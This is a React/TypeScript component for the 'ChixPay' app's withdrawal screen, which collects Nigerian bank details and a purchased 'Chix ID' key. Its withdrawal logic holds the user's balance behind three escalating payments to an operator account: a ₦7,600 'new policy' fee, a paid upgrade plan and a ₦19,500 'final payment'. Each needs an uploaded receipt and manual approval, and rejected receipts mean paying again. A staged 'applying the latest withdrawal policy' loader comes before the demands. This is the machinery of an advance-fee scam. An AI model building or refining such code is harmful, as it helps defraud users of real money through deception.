import { useCallback, useEffect, useRef, useState } from "react";
import { ArrowLeft, Banknote, Check, Copy, IdCard, ShieldAlert, ShieldCheck, Upload } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { supabase } from "@/integrations/supabase/client";
import { ChixLoader } from "@/components/chix-loader";
import { upgradePlans, type UpgradePlan } from "@/components/upgrade-flow";
import { usePaymentDetails } from "@/lib/payment-details";

export const nigerianBanks = [
  "Access Bank", "Citibank Nigeria", "Ecobank Nigeria", "Fidelity Bank", "First Bank of Nigeria",
  "First City Monument Bank (FCMB)", "Globus Bank", "Guaranty Trust Bank (GTBank)", "Heritage Bank",
  "Jaiz Bank", "Keystone Bank", "Kuda Microfinance Bank", "Lotus Bank", "Moniepoint MFB", "Opay",
  "Optimus Bank", "Palmpay", "Parallex Bank", "Polaris Bank", "PremiumTrust Bank", "Providus Bank",
  "Signature Bank", "Stanbic IBTC Bank", "Standard Chartered Bank", "Sterling Bank", "SunTrust Bank",
  "Taj Bank", "Titan Trust Bank", "Union Bank of Nigeria", "United Bank for Africa (UBA)",
  "Unity Bank", "VFD Microfinance Bank", "Wema Bank", "Zenith Bank",
];

export const WITHDRAW_FEE = 7600;
export const FINAL_FEE = 19500;

type Step = "details" | "verify" | "loading" | "policy";
type Stage = "fee" | "upgrade" | "final" | "completed";
type PaymentRow = { id: string; kind: string; status: string; plan_name: string | null; amount: number };
type ActiveWithdrawal = { id: string; amount: number; stage: Stage; bank_name: string; account_number: string };

type Props = {
  onBack: () => void;
  onNeedKey: (message: string) => void;
  onSuccess: (amount: number) => void;
  balance: number;
  defaultName: string;
};

export function WithdrawFlow({ onBack, onNeedKey, onSuccess, balance, defaultName }: Props) {
  const [step, setStep] = useState<Step>("details");
  const payment = usePaymentDetails();
  const [booting, setBooting] = useState(true);
  const [fullName, setFullName] = useState(defaultName);
  const [bank, setBank] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [amount, setAmount] = useState("");
  const [code, setCode] = useState("");
  const [notice, setNotice] = useState("");
  const [busy, setBusy] = useState(false);
  const [active, setActive] = useState<ActiveWithdrawal | null>(null);
  const [payments, setPayments] = useState<PaymentRow[]>([]);
  const [plan, setPlan] = useState<UpgradePlan | null>(null);
  const [file, setFile] = useState<File | null>(null);
  const [copied, setCopied] = useState(false);
  const fileInput = useRef<HTMLInputElement>(null);
  const value = Number(amount.replace(/[^\d]/g, "")) || 0;

  const refresh = useCallback(async () => {
    const { data: userData } = await supabase.auth.getUser();
    const user = userData.user;
    if (!user) return null;
    const { data: rows } = await supabase.from("withdrawals")
      .select("id, amount, stage, bank_name, account_number")
      .eq("user_id", user.id).neq("stage", "completed")
      .order("created_at", { ascending: false }).limit(1);
    const row = rows?.[0];
    if (!row) { setActive(null); return null; }
    const found: ActiveWithdrawal = { id: row.id, amount: Number(row.amount), stage: (row.stage as Stage) ?? "fee", bank_name: row.bank_name, account_number: row.account_number };
    const { data: paid } = await supabase.from("withdrawal_payments")
      .select("id, kind, status, plan_name, amount").eq("withdrawal_id", row.id)
      .order("created_at", { ascending: false });
    setActive(found);
    setPayments((paid ?? []).map((item) => ({ ...item, amount: Number(item.amount) })));
    return found;
  }, []);

  useEffect(() => {
    void (async () => {
      const found = await refresh();
      if (found) setStep("policy");
      setBooting(false);
    })();
  }, [refresh]);

  useEffect(() => {
    if (step !== "loading") return undefined;
    const timer = window.setTimeout(() => setStep("policy"), 1800);
    return () => window.clearTimeout(timer);
  }, [step]);

  const continueToVerify = () => {
    if (fullName.trim().split(/\s+/).length < 2) return setNotice("Enter your full account name.");
    if (!bank) return setNotice("Select your bank.");
    if (!/^\d{10}$/.test(accountNumber.trim())) return setNotice("Enter your 10-digit account number.");
    if (value <= 0) return setNotice("Enter the amount you want to withdraw.");
    if (value > balance) return setNotice("That amount is more than your available balance.");
    setNotice(""); setStep("verify");
  };

  const submit = async () => {
    if (!code.trim()) return setNotice("Enter your Chix ID to continue.");
    setBusy(true); setNotice("");
    const { data, error } = await supabase.rpc("request_withdrawal", {
      _code: code.trim(), _amount: value, _full_name: fullName.trim(), _bank: bank, _account: accountNumber.trim(),
    });
    setBusy(false);
    if (error) return setNotice("We could not process that withdrawal. Please try again.");
    const result = data as { ok?: boolean; reason?: string; stage?: string } | null;
    if (!result?.ok) {
      const reason = result?.reason;
      if (reason === "no_key") return onNeedKey("You need to buy a Chix ID key before you can withdraw.");
      if (reason === "locked") return onNeedKey("Your Chix ID is locked — all its withdrawals have been used. Buy a new key to withdraw.");
      if (reason === "expired") return onNeedKey("Your Chix ID has expired — its validity days are complete. Buy a new key to withdraw.");
      if (reason === "wrong_code") return onNeedKey("That Chix ID is not correct. Buy or activate your Chix ID to withdraw.");
      return setNotice("That withdrawal could not be completed.");
    }
    if (result.stage === "completed") {
      setActive(null); setPayments([]);
      onSuccess(value);
      setStep("loading");
      return;
    }
    await refresh();
    setStep("loading");
  };

  const pending = payments.find((item) => item.status === "pending");
  const stage = active?.stage ?? "fee";
  const rejected = !pending && payments.find((item) => item.status === "rejected" && item.kind === stage);
  const stageLabel = stage === "fee" ? "withdrawal fee" : stage === "upgrade" ? "upgrade" : "final";

  useEffect(() => {
    if (stage !== "upgrade" || plan) return;
    const last = payments.find((item) => item.kind === "upgrade" && item.plan_name);
    const match = upgradePlans.find((item) => item.name === last?.plan_name);
    if (match) setPlan(match);
  }, [stage, plan, payments]);

  const rejectedNotice = rejected ? <div className="auth-enter mt-5 rounded-[26px] border border-destructive/30 bg-destructive/15 p-4">
    <div className="flex items-center gap-2"><ShieldAlert className="size-4"/><p className="text-[10px] font-semibold uppercase tracking-[0.14em]">Payment rejected</p></div>
    <p className="mt-2 text-[11px] leading-5 text-muted-foreground">Your {stageLabel} payment receipt was not approved, so your withdrawal stays on this step. Pay again to the account below and upload a clear receipt — you move to the next step only after it is approved.</p>
  </div> : null;
  const stageAmount = stage === "fee" ? WITHDRAW_FEE : stage === "final" ? FINAL_FEE : plan?.amount ?? 0;

  const uploadPayment = async () => {
    if (!active) return;
    if (stage === "upgrade" && !plan) return setNotice("Choose an upgrade plan first.");
    if (!file) return setNotice("Please attach your payment receipt first.");
    setBusy(true); setNotice("");
    const { data: userData } = await supabase.auth.getUser();
    const user = userData.user;
    if (!user) { setBusy(false); return setNotice("Please sign in again to continue."); }
    const ext = file.name.split(".").pop()?.toLowerCase() || "jpg";
    const path = `${user.id}/withdraw-${stage}-${Date.now()}.${ext}`;
    const upload = await supabase.storage.from("upgrade-receipts").upload(path, file, { contentType: file.type || "application/octet-stream" });
    if (upload.error) { setBusy(false); return setNotice(upload.error.message); }
    const { error } = await supabase.from("withdrawal_payments").insert({
      withdrawal_id: active.id, user_id: user.id, kind: stage,
      plan_name: stage === "upgrade" ? plan?.name ?? null : stage === "fee" ? "Withdrawal fee" : "Final payment",
      amount: stageAmount, receipt_path: path,
    });
    setBusy(false);
    if (error) return setNotice(error.message.includes("pending_payment_exists") ? "You already have a payment awaiting approval. Please wait until it is approved before sending another one." : "That receipt could not be submitted. Please try again.");
    setFile(null);
    await refresh();
  };

  const checkStatus = async () => {
    setBusy(true);
    const held = active?.amount ?? 0;
    const found = await refresh();
    setBusy(false);
    setNotice("");
    if (!found) onSuccess(held);
  };

  const copyAccount = () => {
    void navigator.clipboard.writeText(payment.accountNumber);
    setCopied(true); window.setTimeout(() => setCopied(false), 2000);
  };

  const heading = step === "policy"
    ? active ? (stage === "fee" ? "Withdrawal policy" : stage === "upgrade" ? "Choose an upgrade" : "Final payment") : "Withdrawal complete"
    : step === "verify" ? "Verify your Chix ID" : "Withdraw funds";

  const paymentCard = (title: string, note: string, tag: string) => <div className="auth-enter mt-5 space-y-4">
    <div className="rounded-[26px] border border-gold/30 bg-gold/10 p-4">
      <div className="flex items-center gap-2 text-gold"><ShieldAlert className="size-4"/><p className="text-[10px] font-semibold uppercase tracking-[0.14em]">{tag}</p></div>
      <p className="mt-2 font-display text-3xl font-semibold">₦{stageAmount.toLocaleString()}</p>
      <p className="mt-2 text-[11px] leading-5 text-muted-foreground">{note}</p>
    </div>

    <div className="rounded-[26px] border border-glass-border bg-glass p-4 backdrop-blur-xl">
      <p className="text-xs font-semibold">{title}</p>
      {[["Bank", payment.bank], ["Account name", payment.accountName], ["Account number", payment.accountNumber]].map(([label, val]) => (
        <div key={label} className="mt-3 flex items-center justify-between gap-3 text-xs">
          <span className="text-muted-foreground">{label}</span><span className="font-semibold">{val}</span>
        </div>
      ))}
      <Button variant="glass" size="sm" className="mt-4 w-full rounded-full" onClick={copyAccount}>{copied ? <Check/> : <Copy/>} {copied ? "Account number copied" : "Copy account number"}</Button>
    </div>

    <div className="rounded-[26px] border border-glass-border bg-glass p-4 backdrop-blur-xl">
      <p className="text-xs font-semibold">Upload payment receipt</p>
      <p className="mt-1 text-[11px] leading-5 text-muted-foreground">Attach a clear screenshot of your transfer so it can be reviewed.</p>
      <input ref={fileInput} type="file" accept="image/*,application/pdf" className="hidden" onChange={(e) => { setFile(e.target.files?.[0] ?? null); setNotice(""); }}/>
      <Button variant="glass" size="lg" className="mt-3 w-full justify-start rounded-2xl" onClick={() => fileInput.current?.click()}><Upload/> <span className="truncate">{file ? file.name : "Choose receipt file"}</span></Button>
    </div>

    {notice && <p role="alert" className="rounded-xl border border-destructive/25 bg-destructive/15 p-3 text-xs">{notice}</p>}
    <Button disabled={busy} variant="reward" size="lg" className="w-full" onClick={() => void uploadPayment()}>{busy ? "Submitting…" : "I have paid — submit receipt"}</Button>
  </div>;

  return (
    <section className="pb-28">
      <header className="flex items-center gap-3">
        <Button variant="glass" size="icon" aria-label="Back" className="rounded-full" onClick={onBack}><ArrowLeft/></Button>
        <div>
          <p className="text-[10px] font-semibold uppercase tracking-[0.16em] text-leaf">Cash out</p>
          <h1 className="font-display text-xl font-semibold">{heading}</h1>
        </div>
      </header>

      {booting && <ChixLoader title="Opening withdrawal" note="Checking your withdrawal status…"/>}

      {!booting && step === "details" && <div className="auth-enter mt-5 space-y-4">
        <div className="rounded-[26px] border border-leaf/25 bg-leaf/10 p-4">
          <p className="text-[10px] uppercase tracking-[0.14em] text-leaf">Available balance</p>
          <p className="mt-1 font-display text-3xl font-semibold">₦{balance.toLocaleString()}</p>
        </div>

        <div className="rounded-[26px] border border-glass-border bg-glass p-4 backdrop-blur-xl">
          <p className="text-xs font-semibold">Bank details</p>
          <label className="mt-3 block text-[11px] font-semibold text-muted-foreground">Account name</label>
          <Input value={fullName} onChange={(e) => { setFullName(e.target.value); setNotice(""); }} placeholder="Your full name" className="mt-1.5 h-12 rounded-2xl border-glass-border bg-background/45"/>
          <label className="mt-3 block text-[11px] font-semibold text-muted-foreground">Bank</label>
          <select value={bank} onChange={(e) => { setBank(e.target.value); setNotice(""); }} className="mt-1.5 h-12 w-full rounded-2xl border border-glass-border bg-background/60 px-4 text-sm outline-none focus:ring-1 focus:ring-ring">
            <option value="">Select your bank</option>
            {nigerianBanks.map((item) => <option className="bg-ink" key={item}>{item}</option>)}
          </select>
          <label className="mt-3 block text-[11px] font-semibold text-muted-foreground">Account number</label>
          <Input value={accountNumber} inputMode="numeric" maxLength={10} onChange={(e) => { setAccountNumber(e.target.value.replace(/[^\d]/g, "")); setNotice(""); }} placeholder="0123456789" className="mt-1.5 h-12 rounded-2xl border-glass-border bg-background/45 tracking-[0.12em]"/>
          <label className="mt-3 block text-[11px] font-semibold text-muted-foreground">Amount to withdraw</label>
          <Input value={amount} inputMode="numeric" onChange={(e) => { setAmount(e.target.value.replace(/[^\d]/g, "")); setNotice(""); }} placeholder="e.g. 50000" className="mt-1.5 h-12 rounded-2xl border-glass-border bg-background/45"/>
        </div>

        {notice && <p role="alert" className="rounded-xl border border-destructive/25 bg-destructive/15 p-3 text-xs">{notice}</p>}
        <Button variant="reward" size="lg" className="w-full" onClick={continueToVerify}>Continue</Button>
      </div>}

      {!booting && step === "verify" && <div className="auth-enter mt-5 space-y-4">
        <div className="rounded-[26px] border border-glass-border bg-glass p-4 backdrop-blur-xl">
          <span className="grid size-12 place-items-center rounded-2xl bg-gold/15 text-gold"><IdCard/></span>
          <p className="mt-4 text-xs font-semibold">Enter your Chix ID</p>
          <p className="mt-1 text-[11px] leading-5 text-muted-foreground">Your Chix ID confirms this withdrawal. Each key allows a set number of withdrawals before it locks.</p>
          <Input value={code} onChange={(e) => { setCode(e.target.value.toUpperCase()); setNotice(""); }} placeholder="CHIX-00000-00" className="mt-3 h-12 rounded-2xl border-glass-border bg-background/45 uppercase tracking-[0.14em]"/>
        </div>
        <div className="flex items-center justify-between rounded-[26px] border border-leaf/25 bg-leaf/10 p-4 text-xs">
          <span className="text-muted-foreground">{bank} · {accountNumber}</span>
          <span className="font-display text-base font-semibold text-leaf">₦{value.toLocaleString()}</span>
        </div>
        {notice && <p role="alert" className="rounded-xl border border-destructive/25 bg-destructive/15 p-3 text-xs">{notice}</p>}
        <Button disabled={busy} variant="reward" size="lg" className="w-full" onClick={() => void submit()}>{busy ? "Verifying…" : "Continue"}</Button>
        <Button variant="ghost" className="w-full text-muted-foreground" onClick={() => setStep("details")}>Edit bank details</Button>
      </div>}

      {!booting && step === "loading" && <ChixLoader title="Reviewing your withdrawal" note="Applying the latest withdrawal policy…"/>}

      {!booting && step === "policy" && active && <>
        <div className="mt-4 rounded-[24px] border border-glass-border bg-glass p-4 text-xs backdrop-blur-xl">
          <div className="flex items-center justify-between"><span className="text-muted-foreground">Withdrawal on hold</span><strong className="font-display text-base text-leaf">₦{active.amount.toLocaleString()}</strong></div>
          <p className="mt-1 text-[11px] text-muted-foreground">{active.bank_name} · {active.account_number}</p>
          <div className="mt-3 flex gap-1.5">
            {(["fee", "upgrade", "final"] as const).map((key, index) => {
              const order = { fee: 0, upgrade: 1, final: 2, completed: 3 } as const;
              const done = order[stage] > index;
              return <span key={key} className={`h-1.5 flex-1 rounded-full ${done ? "bg-leaf" : order[stage] === index ? "bg-gold" : "bg-glass-strong"}`}/>;
            })}
          </div>
          <p className="mt-2 text-[10px] uppercase tracking-[0.14em] text-muted-foreground">Step {stage === "fee" ? 1 : stage === "upgrade" ? 2 : 3} of 3</p>
        </div>

        {pending && <div className="auth-enter mt-5 rounded-[28px] border border-gold/30 bg-gold/10 p-6 text-center backdrop-blur-2xl">
          <span className="mx-auto grid size-16 place-items-center rounded-[22px] bg-gold/15 text-gold"><ShieldAlert className="size-8"/></span>
          <h2 className="mt-5 font-display text-2xl font-semibold">Payment under review</h2>
          <p className="mt-2 text-sm leading-6 text-muted-foreground">Your ₦{pending.amount.toLocaleString()} {pending.kind === "fee" ? "withdrawal fee" : pending.kind === "upgrade" ? `${pending.plan_name ?? "upgrade"} upgrade` : "final"} payment receipt has been sent for review. Your withdrawal continues once it is approved.</p>
          <Button disabled={busy} variant="reward" size="lg" className="mt-6 w-full" onClick={() => void checkStatus()}>{busy ? "Checking…" : "Check approval status"}</Button>
          <Button variant="ghost" className="mt-2 w-full text-muted-foreground" onClick={onBack}>Back to wallet</Button>
        </div>}

        {rejectedNotice}

        {!pending && stage === "fee" && paymentCard(
          "Pay the withdrawal fee to",
          "New ChixPay policy: every withdrawal is cleared with a one-time withdrawal fee of ₦7,600. Pay to the same account below and upload your receipt for approval.",
          "New policy · withdrawal fee")}

        {!pending && stage === "upgrade" && <div className="auth-enter mt-5 space-y-3">
          <p className="text-xs leading-5 text-muted-foreground">{rejected ? "Choose your upgrade plan again, pay and upload a valid receipt to continue." : "Your withdrawal fee was approved. Choose an upgrade plan to unlock your payout, then pay and upload your receipt."}</p>
          {upgradePlans.map((item) => (
            <button key={item.name} onClick={() => { setPlan(item); setNotice(""); }} className={`w-full rounded-[24px] border p-4 text-left backdrop-blur-xl transition ${plan?.name === item.name ? "border-leaf/60 bg-leaf/10" : "border-glass-border bg-glass hover:border-leaf/40"}`}>
              <div className="flex items-start justify-between">
                <div><p className="text-[10px] font-semibold uppercase tracking-[0.14em] text-gold">{item.tag}</p><p className="mt-1 font-display text-lg font-semibold">{item.name}</p></div>
                <p className="font-display text-lg font-semibold text-leaf">₦{item.amount.toLocaleString()}</p>
              </div>
              <div className="mt-3 space-y-1.5">{item.perks.map((perk) => <p key={perk} className="flex items-center gap-2 text-[11px] text-muted-foreground"><Check className="size-3.5 text-leaf"/>{perk}</p>)}</div>
            </button>
          ))}
          {plan && paymentCard("Pay your upgrade to", `You selected the ${plan.name} plan. Pay ₦${plan.amount.toLocaleString()} to the account below and upload your receipt for approval.`, "Step 2 · upgrade payment")}
        </div>}

        {!pending && stage === "final" && paymentCard(
          "Pay the final payment to",
          "Final payment: a closing policy payment of ₦19,500 releases your money to your bank account. Pay to the account below and upload your receipt.",
          "Final payment")}
      </>}

      {!booting && step === "policy" && !active && <div className="auth-enter relative mt-6 overflow-hidden rounded-[28px] border border-leaf/30 bg-glass p-6 text-center backdrop-blur-2xl">
        <div className="pointer-events-none absolute inset-0" aria-hidden="true">{Array.from({ length: 10 }).map((_, i) => <span key={i} className={`confetti-bit confetti-${i + 1}`}/>)}</div>
        <span className="success-pop mx-auto grid size-16 place-items-center rounded-[22px] bg-leaf/15 text-leaf"><Check className="size-9"/></span>
        <h2 className="mt-5 font-display text-2xl font-semibold">Congratulations 👏</h2>
        <p className="mt-2 text-sm leading-6 text-muted-foreground">All payments were approved and your money is on its way to your bank account.</p>
        <div className="mt-5 flex items-center justify-center gap-2 rounded-full border border-glass-border bg-glass px-4 py-2 text-[11px]"><ShieldCheck className="size-4 text-leaf"/> Debited from your wallet balance</div>
        <Button variant="reward" size="lg" className="mt-6 w-full" onClick={onBack}><Banknote/> Back to wallet</Button>
      </div>}
    </section>
  );
}
